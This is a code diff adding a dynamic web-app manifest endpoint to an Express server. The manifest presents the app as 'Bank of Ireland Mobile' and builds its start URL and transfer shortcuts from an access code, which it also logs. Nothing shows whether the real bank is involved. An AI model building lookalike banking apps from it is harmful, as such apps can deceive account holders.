@@ -41,6 +41,84 @@ export async function registerRoutes(app: Express): Promise<Server> {
     rolling: true, // Refresh session on each request
   }));
 
+  // Dynamic manifest.json endpoint that includes access code in start_url
+  app.get("/manifest.json", (req, res) => {
+    // Multiple methods to detect access code for maximum compatibility
+    let accessCode = null;
+    
+    // Method 1: Direct query parameter (most reliable)
+    accessCode = req.query.access as string;
+    
+    // Method 2: Parse from referer header
+    if (!accessCode) {
+      const referer = req.get('Referer') || '';
+      if (referer.includes('?access=')) {
+        const urlParams = new URLSearchParams(referer.split('?')[1] || '');
+        accessCode = urlParams.get('access');
+      }
+    }
+    
+    // Method 3: Parse from X-Access-Code header (for programmatic requests)
+    if (!accessCode) {
+      accessCode = req.get('X-Access-Code') as string;
+    }
+    
+    // Generate start_url with access code if present
+    const startUrl = accessCode ? `/?access=${accessCode}` : '/';
+    
+    // Log for debugging
+    console.log(`Manifest requested - Access code: ${accessCode || 'none'}, Start URL: ${startUrl}`);
+    
+    const manifest = {
+      "name": "Bank of Ireland Mobile",
+      "short_name": "BOI Mobile", 
+      "description": "Bank of Ireland Mobile Banking Application",
+      "start_url": startUrl,
+      "display": "standalone",
+      "orientation": "portrait-primary",
+      "theme_color": "#126987",
+      "background_color": "#126987",
+      "scope": "/",
+      "lang": "en-IE",
+      "icons": [
+        {
+          "src": "/boi_app_icon.png",
+          "sizes": "192x192",
+          "type": "image/png",
+          "purpose": "any maskable"
+        },
+        {
+          "src": "/boi_app_icon.png", 
+          "sizes": "512x512",
+          "type": "image/png",
+          "purpose": "any maskable"
+        }
+      ],
+      "categories": ["finance", "banking"],
+      "prefer_related_applications": false,
+      "shortcuts": [
+        {
+          "name": "Make Transfer",
+          "short_name": "Transfer",
+          "description": "Send money quickly",
+          "url": accessCode ? `/uk-transfer?access=${accessCode}` : "/uk-transfer",
+          "icons": [{ "src": "/boi_app_icon.png", "sizes": "96x96" }]
+        },
+        {
+          "name": "View Accounts", 
+          "short_name": "Accounts",
+          "description": "Check your balances",
+          "url": accessCode ? `/dashboard?access=${accessCode}` : "/dashboard",
+          "icons": [{ "src": "/boi_app_icon.png", "sizes": "96x96" }]
+        }
+      ]
+    };
+    
+    res.setHeader('Content-Type', 'application/manifest+json');
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    res.json(manifest);
+  });
+
   // Health check endpoint for connectivity testing
   app.get("/api/health", (req, res) => {
     res.json({ 
